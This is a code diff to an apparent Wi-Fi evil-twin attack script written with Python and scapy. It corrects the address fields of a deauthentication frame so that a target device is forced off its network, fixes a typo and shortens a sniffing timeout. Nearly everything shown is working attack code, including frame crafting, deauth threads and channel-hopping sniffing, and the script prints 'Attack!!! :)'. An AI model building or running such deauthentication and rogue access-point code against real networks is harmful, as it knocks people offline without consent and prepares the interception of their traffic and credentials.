@@ -1,3 +1,4 @@
+
 from itertools import count
 from scapy.all import *
 from threading import Thread
@@ -93,7 +94,7 @@ def evil_twin():
     # Source: https://www.thepythoncode.com/article/force-a-device-to-disconnect-scapy
     print('The target is: ', target_mac)
     print('Attack!!! :)')
-    frame = RadioTap() / Dot11(addr1=gateway_mac, addr2=target_mac, addr3=target_mac) / Dot11Deauth()
+    frame = RadioTap() / Dot11(addr1=target_mac, addr2=gateway_mac, addr3=gateway_mac) / Dot11Deauth()
     deauth1 = threading.Thread(target=for_ap, args=(frame, interface))
     deauth1.start()
     deauth1.join()
@@ -129,7 +130,7 @@ if __name__ == "__main__":
         print("Interfaces:")
         for (i, item) in enumerate(interfaces, start=1):
             print("   " + str(i) + ". " + item)
-        val = input("Please Choose Interface for Dividing (Optinal), otherwise enter -1: ")
+        val = input("Please Choose Interface for Dividing (Optional), otherwise enter -1: ")
 
     # 2. Choose card interface to split for 2 different interfaces
         flag_div = True
@@ -202,7 +203,7 @@ if __name__ == "__main__":
     channel_changer.start()
 
     # 5. Start sniffing (Synchronous process)
-    sniff(prn=callback, iface=interface, timeout=30)
+    sniff(prn=callback, iface=interface, timeout=10)
 
     # 6. Stop changing channel thread
     stop_threads = True
